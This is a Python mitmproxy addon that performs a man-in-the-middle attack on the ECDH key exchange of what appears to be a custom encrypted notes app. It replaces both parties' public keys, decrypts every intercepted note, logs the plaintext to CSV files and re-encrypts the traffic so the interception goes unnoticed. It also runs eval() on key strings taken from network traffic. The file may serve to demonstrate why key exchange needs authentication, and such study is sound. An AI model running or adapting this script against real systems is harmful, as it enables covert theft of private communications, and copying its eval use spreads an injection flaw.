"""
Run as follows: mitmproxy -s mitm.py
"""
import json
from cli.utils import decrypt_note, encrypt_note
from crypto.ecc import scalar_mult
from crypto.ecdh import make_keypair
from datetime import datetime


class ReplaceKeys:
    def __init__(self):
        self.private_for_client, self.public_for_server = make_keypair()
        self.private_for_server, self.public_for_client = make_keypair()
        self.client_public_key = None
        self.server_public_key = None
        self.client_shared_secret = None
        self.server_shared_secret = None

    def re_encrypt_client(self, name, content):
        name, content = decrypt_note(self.client_shared_secret[0], name, content)
        with open('notes_from_request.csv', 'a') as f:
            f.write(f'{name},{content},{datetime.now()}\n')
        return encrypt_note(self.server_shared_secret[0], name, content)

    def re_encrypt_server(self, name, content):
        name, content = decrypt_note(self.server_shared_secret[0], name, content)
        with open('notes_from_response.csv', 'a') as f:
            f.write(f'{name},{content},{datetime.now()}\n')
        return encrypt_note(self.client_shared_secret[0], name, content)

    def request(self, flow):
        if 'public_key' in flow.request.text:
            json_body = json.loads(flow.request.text)
            self.client_public_key = eval(json_body['public_key'])
            json_body['public_key'] = str(self.public_for_server)
            flow.request.text = json.dumps(json_body)

        if 'message' in flow.request.text:
            json_body = json.loads(flow.request.text)
            json_body['name'], json_body['message'] = self.re_encrypt_client(json_body['name'], json_body['message'])
            flow.request.text = json.dumps(json_body)

    def response(self, flow):
        json_body = json.loads(flow.response.text)
        if 'public_key' in flow.response.text:
            self.server_public_key = eval(json_body['public_key'])
            json_body['public_key'] = str(self.public_for_client)
            flow.response.text = json.dumps(json_body)

            self.client_shared_secret = scalar_mult(self.private_for_server, self.server_public_key)
            self.server_shared_secret = scalar_mult(self.private_for_client, self.client_public_key)

        elif 'get_notes' in flow.request.path:
            for i, note in enumerate(json_body['message']):
                json_body['message'][i]['name'], json_body['message'][i]['message'] = self.re_encrypt_server(
                    note['name'],
                    note['message'])

        elif 'message' in flow.response.text:
            json_body['message']['name'], json_body['message']['message'] = self.re_encrypt_server(
                json_body['message']['name'],
                json_body['message']['message'])

        flow.response.text = json.dumps(json_body)


addons = [ReplaceKeys()]
